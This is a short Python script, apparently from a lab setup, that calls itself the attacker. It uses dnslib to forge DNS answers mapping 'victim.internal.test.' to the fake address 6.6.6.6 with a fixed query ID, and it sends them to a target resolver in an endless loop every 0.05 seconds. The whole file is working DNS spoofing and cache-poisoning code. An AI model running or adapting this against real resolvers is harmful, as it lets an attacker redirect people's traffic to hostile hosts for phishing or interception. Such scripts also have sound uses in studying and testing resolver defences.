import socket
import time

from dnslib import A, DNSRecord, QTYPE, RR

RESOLVER_ADDR = ("10.0.0.2", 40000)

QUERY_ID = 0x1234
QNAME = "victim.internal.test."
FAKE_IP = "6.6.6.6"
TTL = 30

INTERVAL_SECONDS = 0.05

print("attacker started")
print(f"target resolver={RESOLVER_ADDR[0]}:{RESOLVER_ADDR[1]}")
print(f"fake answer: {QNAME} A {FAKE_IP}")
print(f"query id={QUERY_ID}")

while True:
    query = DNSRecord.question(QNAME, "A")
    query.header.id = QUERY_ID

    response = query.reply()
    response.add_answer(
        RR(
            rname=QNAME,
            rtype=QTYPE.A,
            rclass=1,
            ttl=TTL,
            rdata=A(FAKE_IP),
        )
    )

    packet = bytes(response.pack())

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(packet, RESOLVER_ADDR)

    print(f"sent fake response id={QUERY_ID} qname={QNAME} ip={FAKE_IP}")

    time.sleep(INTERVAL_SECONDS)